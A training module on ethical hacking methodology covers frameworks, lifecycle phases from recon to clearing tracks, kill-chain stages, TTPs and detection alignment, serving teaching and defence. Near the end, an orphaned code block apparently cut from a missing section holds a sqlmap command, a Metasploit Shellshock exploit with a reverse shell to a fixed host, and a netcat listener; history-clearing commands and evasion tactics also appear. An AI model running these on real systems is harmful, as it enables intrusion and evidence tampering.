1. Executive Summary

Operational Premise: Ethical hacking is not random guessing. It is a disciplined, repeatable process governed by frameworks that ensure coverage, reproducibility, and legal safety. This module translates adversary logic into professional methodology, teaching you to plan assessments, execute phases in scope, and align every offensive action with defensive detection.

Having cleared the Ethical Hacking Concepts gateway, articulating the difference between adversarial and ethical hacking, authorization boundaries, and reporting requirements, you are now cleared to study the execution lifecycle, major industry frameworks, and kill-chain mechanics that turn theoretical knowledge into structured engagements.

  • Objective 1: Understand the purpose and structure of major hacking frameworks and why they matter for professional assessments.
  • Objective 2: Apply the ethical hacking lifecycle, from reconnaissance through reporting, in a structured, repeatable manner.
  • Objective 3: Recognize how adversaries use TTPs, kill chains, and behavioral indicators to achieve objectives, and how defenders can detect them.

2. Beginner Level

Foundational concepts for practitioners new to hacking methodologies and frameworks. Assume zero prior knowledge of penetration testing lifecycles or adversary modeling.

Core Concepts

Frameworks and repeatable methodologies give ethical hackers and defenders a common language and a structured approach for planning, executing, and validating security assessments. They help ensure coverage, support reproducible testing, and align offensive exercises with defensive detection and response.

Why Frameworks Matter

  • Coverage: Reduces the chance of missing critical paths such as APIs, authentication flows, cloud assets, or exposed services.
  • Reproducibility: Allows teams to repeat the same test steps to confirm whether remediation worked.
  • Alignment: Maps offensive actions to defensive controls, logs, alerts, and frameworks such as MITRE ATT&CK.

# Analogy / Context

Think of frameworks as the architectural blueprints for a building. Without blueprints, construction is chaotic, corners are cut, and the final structure is unsafe. With blueprints, every beam, wire, and pipe has a purpose and a place. Frameworks provide the same structure for security assessments, they ensure nothing is forgotten, everything is documented, and the final result is defensible.

Practical Considerations for Ethical Hackers

  • Scope is King: Always verify approved IP ranges, domains, systems, and time windows before testing.
  • Use Non-Destructive Validation: Prove impact without deleting data, disrupting services, or exceeding authorization.
  • Document in Real Time: Record commands, timestamps, screenshots, tool output, and evidence as the assessment progresses.
  • Map to Defense: Link each finding to affected controls, expected logs, detection opportunities, and remediation steps.
Adversarial Awareness Disclaimer: Understanding these phases helps ethical hackers think like attackers so they can defend better. Always obtain explicit written permission before scanning, testing, exploiting, or validating any target system.

3. Intermediate Level

Hands-on application of hacking methodologies and frameworks in real environments. This section covers the ethical hacking lifecycle, major frameworks, and practical execution phases.

The Ethical Hacking Lifecycle

Most methodologies including PTES, NIST, OWASP, and MITRE ATT&CK follow a similar practical flow. The exact names may differ, but the operator logic remains consistent.

Major Methodologies

OWASP (Web Focus)

Best For: Web Application Penetration Testing.

  • Focus: Top 10 Vulnerabilities (SQLi, XSS, Broken Access Control).
  • Structure: Static taxonomy of web risks. Less about "how to hack" and more about "what to look for."

NIST SP 800-115 (Standard)

Best For: Enterprise Network Penetration Testing.

  • Focus: Three main stages: Planning, Discovery, Analysis.
  • Structure: Highly formalized, often required for government and large corporate audits.

PTES (Penetration Testing Execution Standard)

Best For: Comprehensive End-to-End Assessments.

  • Focus: 7 Phases from Triage to Reporting.
  • Structure: Very detailed, includes specific sections for social engineering and physical security.

Kill Chain (MITRE ATT&CK)

Best For: Mapping Attacks to Defensive Strategies.

  • Focus: 7 Steps: Recon, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives.
  • Structure: Helps defenders understand where in the process their tools (SIEM/EDR) should trigger alerts.

The Ethical Hacking Framework (Detailed Execution)

Phase 1: Reconnaissance

Footprinting is where the engagement really begins. You map out the target without ever touching their systems. The goal is simple: build a clear picture of the organization before making any moves. During this stage, you gather anything you can from public sources — domain names, IP ranges, cloud footprints, employee details, leaked documents, exposed repositories, job postings, and anything else that shapes your target profile.

This type of recon is quiet and completely external. There is no direct interaction with the target environment. Instead, you're harvesting intelligence from sources like WHOIS records, DNS data, public websites, social media, professional networks, search engines, and historical breach data. This information helps you understand the organization's structure, the technologies they use, and where weak points might exist.

Phase 1.1: Scanning (Active Recon – Technical Mapping)

Once passive intel is collected, scanning begins — the technical side of recon where you actively probe the environment. Here, you're validating what you found during footprinting and expanding the picture with real, direct data.

Scanning is used to identify:

  • Active hosts
  • Open ports
  • Running services
  • Network filtering rules
  • Operating system fingerprints
  • Live attack surfaces

This is still reconnaissance, but now you're making controlled contact with the target. Tools like Nmap, Masscan, custom scripts, and protocol-level probes come into play. Scanning acts as the bridge between passive recon and full enumeration.

Phase 1.2: Enumeration – Deep Interaction (Pulling Real Data)

Enumeration is the final and most intrusive stage of recon. The goal here is to extract real information directly from exposed services. Instead of simply noting that a port is open, you're digging into what's behind it.

Enumeration includes:

  • Pulling usernames and groups from SMB, LDAP, RPC
  • Grabbing service banners and version information
  • Querying misconfigured or exposed APIs
  • Retrieving routing or service details from network protocols
  • Listing shares, drives, or exposed directories
  • Probing authentication mechanisms
  • Testing for anonymous or guest access

Enumeration converts recon data into actionable intelligence. This is where real attack paths begin to surface — weak credentials, verbose services, misconfigurations, legacy systems, and all the small cracks that can be leveraged to gain initial access.

Phase 2: Vulnerability Scanning

Once reconnaissance and enumeration give you a detailed picture of the environment, the next step is vulnerability scanning. This phase focuses on identifying weaknesses across the systems, services, applications, and configurations you've already mapped out. The goal is straightforward: find the gaps that can be exploited later.

Attackers and ethical hackers use scanning results to understand the real attack surface and prioritize which entry points are worth pursuing. This phase bridges the gap between recon and exploitation by turning raw discovery into validated weaknesses.

Common outputs of vulnerability scanning include:

  • Identified CVEs tied to software or service versions
  • Misconfigurations across operating systems, firewalls, and applications
  • Weak or default credentials
  • Unpatched services or outdated components
  • Exposure of sensitive data or internal paths
  • Known exploits associated with discovered vulnerabilities

Phase 3: Initial Access

Gaining access is the phase where reconnaissance and vulnerability data finally turn into action. This is where you execute the techniques that give you an initial foothold on the target environment. Your goal here is straightforward: exploit a weakness and establish your first entry point.

Depending on the target surface, this might involve web exploitation, credential attacks, network-level vulnerabilities, misconfigurations, or directly exploiting known CVEs. Once a foothold is obtained, the real work begins.

Key activities in this phase include:

  • Exploiting discovered vulnerabilities (RCE, SQLi, LFI/RFI, etc.)
  • Brute forcing or cracking credentials
  • Abusing misconfigurations or weak access controls
  • Dropping payloads or gaining an interactive shell

Privilege Escalation

Initial access almost always lands you in a low-privilege context. Privilege escalation is where you leverage local weaknesses to climb higher, moving from a basic user to an administrative or root-level position. This step is essential, as elevated privileges unlock the sensitive systems, protected operations, and broader visibility needed to progress deeper into the network.

  • Exploiting SUID/SGID or kernel vulnerabilities
  • Credential harvesting from memory or misconfigured storage
  • DLL hijacking, service abuse, or weak permissions
  • Token impersonation or pass-the-hash techniques

Lateral Movement

Once you have elevated access, the next objective is to expand your reach. Lateral movement allows you to pivot across hosts, discover new assets, and chase higher-value systems such as domain controllers, application servers, databases, or cloud consoles.

  • Pivoting through compromised hosts
  • Accessing network shares, remote services, and internal applications
  • Reusing harvested credentials across the network
  • Enumerating trust relationships and accessible systems

Phase 3 is where the attack path really opens up. This stage often determines the success of the entire engagement. Your foothold becomes leverage, your escalation unlocks capability, and your lateral movement reveals the route to the ultimate target.

Phase 4: Maintaining Access

Once you've broken into a system, the next priority is staying there. Maintaining access is all about persistence — keeping your foothold alive long enough to complete your objectives. At this point, you typically have user-level or admin-level access, and now you want to ensure that access doesn't disappear if the system reboots, an account gets disabled, or the initial exploit is patched.

Attackers use this phase to turn a one-time compromise into long-term control. That can mean quietly operating in the background, or using the compromised system as a staging point to pivot deeper into the network.

Common persistence and control techniques include:

  • Installing backdoors, web shells, or scheduled tasks
  • Adding new user accounts or modifying existing ones
  • Deploying malware or remote agents for continuous access
  • Abusing legitimate services (SSH keys, startup scripts, registry run keys)
  • Capturing credentials, tokens, and session data
  • Using the compromised host to pivot to other systems

Maintaining access isn't just about staying inside — it's about protecting your foothold from others. Skilled attackers may patch the exploit they used, disable logs, or modify configurations so no one else can kick them out. A well-maintained foothold can last weeks, months, or even longer if done quietly enough.

Phase 5: Clearing Tracks

After completing their objectives, attackers focus on one thing: disappearing without a trace. Clearing tracks is all about removing or manipulating anything that could expose their presence, methods, or timeline inside the environment. A clean exit makes incident response harder, delays detection, and protects the attacker's tooling and infrastructure.

To stay undetected, attackers tamper with evidence at every layer. This can include wiping logs, altering timestamps, disabling auditing features, or replacing forensic artifacts with clean versions. The goal is simple: make it look like nothing ever happened.

Common track-clearing techniques include:

  • Deleting or modifying system, security, and application logs
  • Covering shell history (e.g., history -c, clearing .bash_history)
  • Removing malware, payloads, or dropped tools
  • Timestamp tampering (timestomping)
  • Disabling or corrupting logging mechanisms
  • Deleting created accounts, scheduled tasks, or persistence artifacts
  • Clearing command-line or PowerShell execution traces

When done properly, these actions make forensic reconstruction significantly harder and can keep a breach hidden long after the attacker is gone.

Attack Progression Model (Kill-Chain Concepts)

A stages-based model helps map how an adversary progresses from reconnaissance and initial access to achieving their objective. Typical stages to map and instrument with telemetry are: reconnaissance, initial access, execution, persistence, privilege escalation, defense evasion, credential access, discovery, lateral movement, collection, exfiltration, and impact. Map each stage to concrete observables (process creation, auth logs, network flows, DNS/certificate telemetry, EDR signals) and provide stage-aware detection rules and playbooks to interrupt adversary workflows. Where useful, align this mapping to MITRE ATT&CK techniques for repeatable emulation and detection coverage.

Note: Map telemetry (endpoint, network, cloud logs) to these stages to accelerate detection and prioritise containment actions.

Kill Chain Overview

Kill Chain Phase What Happens Attacker Objective
1. Reconnaissance Target is profiled to identify weaknesses, technologies, and people. Collect intelligence while remaining unnoticed.
2. Weaponization Exploit and payload are combined into a usable attack artifact. Create a payload tailored to the target environment.
3. Delivery The payload is transmitted to the victim through a reachable channel. Place the malicious content onto the target system.
4. Exploitation The exploit triggers execution by abusing a vulnerability or user action. Gain initial code execution.
5. Installation Persistence mechanisms or malware are deployed. Maintain long-term access.
6. Command & Control (C2) A remote communication channel is established. Control compromised systems and move data.
7. Actions on Objectives The attacker executes final mission goals. Steal data, escalate access, disrupt, or spy.

4. Advanced / Operator Level

Deep technical detail for operators conducting authorized assessments, purple-team exercises, or threat hunting engagements. This level covers TTPs, IoCs/IoBs, emulation vs detection, and analytical models.

Tactics, Techniques & Procedures (TTPs) — Practical Use

TTPs are the operational building blocks. A tactic is a goal (e.g., persistence), a technique is a method (e.g., scheduled task), and a procedure is the step-by-step implementation.

For operational use:

  • Enumerate likely TTPs against your environment using threat models and industry telemetry.
  • Create test cases that validate both offensive success and defensive detection for each technique.
  • Instrument logging and alerts at points where techniques leave reliable artifacts (process creation, network flows, auth events).
Remember: Prioritise techniques by exploitability and business impact. Focus first on high-probability, high-impact TTPs.

TTP Components (Conceptual View)

Component What it Represents Why it Matters
Tactic The high-level adversary objective — what the attacker is trying to achieve (e.g., persistence, privilege escalation, defense evasion). Frames attacker intent and groups behavior at a strategic level.
Technique The specific method used to accomplish a tactic — how the action is carried out (e.g., scheduled tasks, PowerShell execution, service abuse). Describes the attacker's tradecraft and technical capability.
Procedure The exact implementation of a technique, including commands, scripts, sequences, or observable behaviors. Provides reproducible detail for simulation, detection, and response.

Operational Use in Cybersecurity

Component Practical Operational Use
Tactic Identify adversary objectives relevant to your environment, map them to MITRE ATT&CK tactic categories, and prioritize controls around the highest-risk goals.
Technique Develop offensive and defensive test cases, enable telemetry for known technique indicators, and tune threat hunting queries around recurring behavior patterns.
Procedure Simulate realistic attacks using concrete commands or payloads, validate forensic artifacts generated by each step, and train SOC teams with procedure-level detection exercises.

Indicators of Compromise (IoCs) & Indicators of Behaviour

IoCs (hashes, IPs, domains, file paths) are useful but short lived. Behavioural indicators (patterns of activity) are more durable and actionable.

Best practice:

  • Capture both artifact-based IoCs and higher-level behavioral rules (e.g., unusual parent-child process relationships, atypical data flows).
  • Automate enrichment (WHOIS, passive DNS, certificate transparency) and vet sources before ingestion.
  • Track IoC TTLs and provenance. Remove or archive stale indicators to prevent alert fatigue.
Remember: Use IoCs for rapid triage, but rely on behavioural detections for sustained defence.

Indicator Types (Conceptual Comparison)

Indicator Type What It Represents Primary Strength Key Limitation
Indicators of Compromise (IoCs) Artifact-level evidence of malicious activity such as file hashes, IP addresses, domains, registry keys, or file paths. Precise, fact-based data points that are easy to match in SIEM and EDR platforms. Short-lived and easily changed by attackers, with limited value against new threats.
Indicators of Behaviour (IoBs) Patterns of adversary behaviour such as abnormal process relationships, unusual authentication flows, lateral movement, or atypical data access. Durable indicators that capture attacker intent and tradecraft rather than artifacts. Require strong baselining and careful tuning to avoid false positives.

Operational Detection Guidance

Indicator Type Operational Best Practices
IoCs Automate enrichment using WHOIS, passive DNS, and certificate transparency data; track indicator lifetime and provenance; regularly archive or purge stale indicators to reduce alert fatigue.
IoBs Build detections around behavioural logic such as parent–child process anomalies, authentication misuse, and technique patterns; combine IoBs with IoCs to achieve layered and resilient detection coverage.

Practical: Emulation vs Detection Alignment

A practical cycle to test both offensive logic and defensive coverage:

  1. Choose a realistic adversary profile and a limited objective (e.g., credential theft from webmail).
  2. Map the attack path into discrete techniques and expected artifacts.
  3. Execute controlled emulation (lab or scoped engagement), capture telemetry, and record exact commands.
  4. Feed telemetry to defenders; iterate on analytics until behavior is detected reliably with acceptable false-positive rates.
  5. Produce a combined deliverable: adversary emulation playbook + detection playbook + remediation checklist.
Note: Treat each emulation as a test. Measure detection time, mean time to analyst (MTTA), and remediation efficacy. Report these metrics.

ATT&CK-style Behavior Mapping

Behavioural taxonomies (technique catalogs) provide granular mappings of adversary actions (e.g., phishing, DLL search order hijack, token impersonation, exfiltration over alternate channels).

Use such mappings to:

  • Design adversary emulations that mimic real-world TTPs.
  • Drive detection engineering by turning techniques into analytics & alerts.
  • Prioritise mitigations where multiple high-likelihood techniques converge.
Remember: When writing detections, choose observable behaviors (API calls, registry writes, network patterns) over brittle signatures.

Analytical Models: Diamond & Related Approaches

Analytical models connect four core elements of an intrusion event (Adversary, Capability, Infrastructure, and Victim/context), to support hypothesis-driven investigations.

Use the model to:

  • Correlate infrastructure artifacts (domains, IPs, certs) to actor profiles and repeat patterns.
  • Identify capability reuse (tooling fingerprints) across incidents.
  • Prioritise containment by isolating attacker infrastructure quickly.
Remember: Link Indicators of Compromise (IoCs) back to the evidence that produced them (timestamp, raw output, query parameters).

5. Adversarial Level

Threat actor perspective. Advanced persistent threats, criminal groups, and red teams do not ignore methodologies, they study them to understand defensive detection opportunities and exploit the gaps.

Threat Actor Behavior

Methodology Exploitation

  • Target organizations that treat penetration testing as a compliance checkbox rather than an operational discipline.
  • Exploit the gap between "accepted risk" and actual control implementation during vulnerability scanning phases.
  • Use the predictable rhythm of assessment cycles (quarterly scans, annual penetration tests) to schedule attacks during "quiet" periods.

Kill Chain Abuse

  • Perform reconnaissance during off-hours when defenders are less likely to notice scanning activity.
  • Weaponize payloads to avoid common detection signatures (e.g., using legitimate tools for post-exploitation).
  • Establish C2 channels that mimic legitimate traffic (HTTPS to cloud providers, DNS tunneling) to evade network detection.

Detection Evasion

  • Study public MITRE ATT&CK mappings to understand which techniques defenders have detection rules for.
  • Use "Living off the Land" (LOLBin) tools to blend with normal administrative activity and avoid alerting on suspicious binaries.
  • Employ fileless malware and memory-only execution to bypass traditional antivirus and EDR signatures.

Note: "Frameworks are not cages. They are the scaffolding that keeps your creativity legal, reproducible, and defensible. The adversary ignores rules. You do not. That discipline is your competitive advantage."

# Expect 200 if vulnerable; 403 if patched

# SQL injection validation with safe defaults
$ sqlmap -u "http://target.com/page?id=1" --batch --level=2 --risk=1 --tables

# Controlled Metasploit PoC with immediate session termination plan
$ msfconsole -q -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS target.com; set PAYLOAD cmd/unix/reverse_perl; set LHOST 10.10.14.5; exploit -j"

# Quick reverse-shell validation (disconnect immediately after confirmation)
$ nc -lvnp 4444 &

7. Key Takeaways

Area What Was Proven Operational Meaning
Ethical Hacking Follows a Structured Process Successful assessments follow repeatable methodologies that move from reconnaissance through reporting rather than relying on random testing. Teams can plan, resource, and audit engagements using consistent frameworks.
Reconnaissance Creates the Foundation Information gathered during footprinting, scanning, and enumeration determines the quality of all later attack decisions. Time invested in recon reduces wasted effort and prevents scope drift during exploitation.
Vulnerabilities Must Be Validated Finding a weakness is not enough. Ethical hackers must safely verify exploitability and demonstrate business impact. Validated findings withstand scrutiny and justify remediation investment.
Initial Access Is Only the Beginning Privilege escalation, lateral movement, persistence, and objective-based actions often reveal the true risk to an organization. Comprehensive testing models real-world attacker behavior rather than shallow vulnerability checks.
Frameworks Improve Consistency OWASP, NIST, PTES, MITRE ATT&CK, and Kill Chain models provide common terminology and structured assessment approaches. Common language aligns offensive testers, defensive teams, auditors, and stakeholders.
Think Like an Adversary, Act Like a Professional Understanding attacker goals helps identify realistic attack paths while remaining within authorized scope and Rules of Engagement. Professional discipline separates ethical testing from criminal activity.
Tools Support Methodology Tools such as Nmap, Burp Suite, Metasploit, BloodHound, and Wireshark assist testing, but methodology and analysis drive successful engagements. Tool proficiency without methodology produces noisy, incomplete, and potentially dangerous results.
Detection Opportunities Exist at Every Phase Reconnaissance, exploitation, privilege escalation, persistence, and command-and-control activities all generate evidence that defenders can monitor. Offensive knowledge directly improves defensive telemetry design and tuning.
Reporting Delivers Security Value The final deliverable is not access to a system, but actionable findings, evidence, risk analysis, and remediation guidance. Without documentation, technical findings cannot be tracked, funded, or fixed.
Authorization Remains Mandatory Every assessment must be conducted within approved scope, documented authorization, and clearly defined Rules of Engagement. Legal protection and professional credibility depend on written, bounded consent.
Note: Use frameworks as scaffolding, not scripts to follow blindly. Map techniques to observables, validate findings with evidence, and always align your offensive tests to the defender's detection capabilities.
